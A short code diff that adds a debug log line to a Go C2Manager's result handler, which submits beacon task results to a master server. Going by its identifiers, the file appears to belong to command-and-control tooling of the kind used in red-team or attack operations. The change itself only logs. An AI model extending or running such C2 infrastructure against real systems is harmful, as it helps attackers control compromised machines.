@@ -1470,6 +1470,9 @@ func (c2 *C2Manager) handleResult(parts []string, isDuplicate bool) string {
 				submitTaskID = masterTaskID
 			}
 
+			if c2.debug {
+				logf("[C2] Submitting single RESULT to Master: taskID=%s, beaconID=%s, resultLen=%d, chunkIndex=1, totalChunks=1", submitTaskID, bid, len(res))
+			}
 			taskComplete, err := masterClient.SubmitResult(submitTaskID, bid, 1, 1, res)
 			if err != nil {
 				if c2.debug {
